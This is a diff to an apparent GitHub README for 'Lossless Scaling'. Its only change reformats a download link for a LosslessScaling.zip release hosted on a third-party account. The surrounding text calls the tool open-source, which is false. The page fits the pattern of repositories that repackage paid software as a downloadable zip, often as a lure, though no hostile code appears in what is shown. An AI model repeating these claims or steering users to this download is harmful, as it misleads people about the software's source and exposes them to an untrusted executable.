@@ -19,7 +19,7 @@ Lossless Scaling is a powerful open-source gaming optimization utility. It deliv
 ---
 
 ## Install
-[Download LosslessScaling.zip](https://github.com/Allanlv5324F/Lossless-Scaling-Github/releases/download/v3.22/LosslessScaling.zip)
+[Download `LosslessScaling.zip`](https://github.com/Allanlv5324F/Lossless-Scaling-Github/releases/download/v3.22/LosslessScaling.zip)
 ---
 
 > Optimized for Windows 11.
